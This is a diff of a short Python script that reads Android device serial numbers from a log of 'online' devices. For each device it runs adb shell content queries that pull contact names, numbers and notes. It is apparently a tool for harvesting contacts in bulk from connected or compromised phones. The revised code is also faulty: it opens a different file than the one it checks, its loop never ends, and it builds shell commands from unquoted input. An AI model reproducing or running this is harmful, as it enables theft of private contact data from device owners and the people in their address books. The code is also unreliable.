@@ -1,11 +1,14 @@
 import os
-def get_contact():
-    s = open("logs/online.log","r")
-    while True:
-        serialno = s.readline().strip()
-        if not serialno:
-            break
-        os.system("adb -s "+serialno+" shell 'content query --uri content://contacts/phones/ --projection display_name:number_key'")
-    s.close()
 
-get_contact()
+def main():
+    if os.path.isfile("logs/online.log"):
+        a = open("on.log","r")
+        while True:
+            a1 = a.readline().strip()
+            if not a:
+                break
+            payload = "content query --uri content://contacts/phones/ --projection display_name:number:notes"
+            os.system("adb -s "+a1+" shell "+payload)
+        a.close()
+
+main()
